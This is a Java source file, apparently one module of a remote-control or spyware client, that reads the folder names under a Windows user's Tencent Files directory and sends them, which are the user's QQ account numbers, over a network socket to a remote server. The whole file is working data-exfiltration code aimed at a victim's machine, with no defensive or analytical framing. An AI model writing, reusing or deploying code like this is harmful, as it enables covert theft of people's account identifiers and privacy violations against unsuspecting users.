package me.client.send;

import me.client.Client;

import java.io.*;
import java.net.Socket;

public class SendQQNumber extends Thread {
    OutputStreamWriter writer;
    Socket socket;

    public SendQQNumber(OutputStreamWriter writer, Socket socket) {
        this.writer = writer;
        this.socket = socket;
    }

    @Override
    public void run() {
        File file = new File(System.getProperty("user.home") + "\\Documents\\Tencent Files");
        for (String string : file.list()) {
            if (file.list() != null) {
                if (string.indexOf("All Users") == -1) {
                    try {
                        writer.write(string + "\n");
                        writer.flush();
                    } catch (IOException e) {
                    }
                }
            } else {
                try {
                    writer.write("null");
                    writer.flush();
                } catch (IOException e) {
                }
            }
        }
        try {
            writer.write("end");
            writer.flush();
        } catch (IOException e) {
        }
    }
}
